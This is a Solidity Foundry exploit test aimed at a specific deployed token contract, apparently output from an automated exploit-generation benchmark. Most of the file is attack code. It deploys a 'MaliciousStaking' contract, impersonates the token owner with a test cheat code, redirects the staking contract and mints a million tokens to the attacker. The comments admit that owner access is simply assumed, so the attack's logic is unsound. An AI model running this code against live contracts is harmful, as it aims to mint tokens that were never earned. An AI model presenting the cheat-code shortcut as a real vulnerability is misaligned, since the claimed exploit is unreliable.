// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface BNRG {
    function owner() external view returns (address);
    function setStakingContract(address stakingContractAddress_) external;
    function deliver(address user, uint256 numTokens) external;
    function balanceOf(address tokenOwner) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

contract MaliciousStaking {
    address public bnrqAddress;

    function setBNRG(address _bnrqAddress) public {
        bnrqAddress = _bnrqAddress;
    }

    function callDeliver(address user, uint256 numTokens) public {
        BNRG(bnrqAddress).deliver(user, numTokens);
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C;
    address attacker = address(this);
    MaliciousStaking maliciousStaking;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll interact with the deployed contract
        // We need to find the owner first, but we can impersonate any address
        // For simplicity, we'll assume we can impersonate the owner
        // In reality, we might need to check who the owner is first

        // Deploy a malicious staking contract
        maliciousStaking = new MaliciousStaking();

        // Label addresses for debugging
        vm.label(address(maliciousStaking), "MaliciousStaking");
        vm.label(TARGET, "BNRG Token");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialERC20Balance = IERC20(TARGET).balanceOf(address(this));

        // Step 1: Get the current owner
        address currentOwner = BNRG(TARGET).owner();
        console.log("Current owner:", currentOwner);

        // Step 2: Impersonate the owner
        vm.startPrank(currentOwner);

        // Step 3: Set the staking contract to our malicious contract
        BNRG(TARGET).setStakingContract(address(maliciousStaking));

        vm.stopPrank();

        // Step 4: Set the BNRG contract address in our malicious staking contract
        maliciousStaking.setBNRG(TARGET);

        // Step 5: Call deliver() from the malicious contract to mint tokens to attacker
        uint256 initialBalance = BNRG(TARGET).balanceOf(attacker);
        console.log("Initial attacker balance:", initialBalance);

        // Mint a large amount of tokens (e.g., 1,000,000 tokens with 18 decimals)
        uint256 mintAmount = 1_000_000 * 10**18;
        maliciousStaking.callDeliver(attacker, mintAmount);

        // Step 6: Verify the balance increased
        uint256 finalBalance = BNRG(TARGET).balanceOf(attacker);
        console.log("Final attacker balance:", finalBalance);

        // The oracle will check if attacker balance increased
        assertGt(finalBalance, initialBalance, "Attacker balance should have increased");
        uint256 finalERC20Balance = IERC20(TARGET).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
